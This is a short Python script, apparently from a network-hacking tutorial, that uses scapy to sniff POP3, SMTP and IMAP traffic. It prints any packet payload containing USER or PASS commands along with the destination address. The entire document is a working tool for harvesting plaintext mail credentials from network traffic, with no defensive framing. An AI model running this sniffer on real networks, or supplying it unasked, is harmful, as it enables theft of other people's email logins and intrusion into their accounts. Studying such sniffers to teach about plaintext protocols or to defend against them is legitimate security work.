from scapy.all import sniff, TCP, IP

# the packet callback
def packet_callback(packet):
    # check to make sure it has a data payload
    if packet[TCP].payload: 
        mypacket = str(packet[TCP].payload)
        # whether the payload contains the typical USER or PASS mail command
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
            print(f"[*] Destination: {packet[IP].dst}")
            print(f"[*] {str(packet[TCP].payload)}")

def main():
    # fire up the sniffer
    sniff(filter='tcp port 110 or tcp port 25 or tcp port 143',
          prn=packet_callback, store=0)

if __name__ == '__main__':
    main()
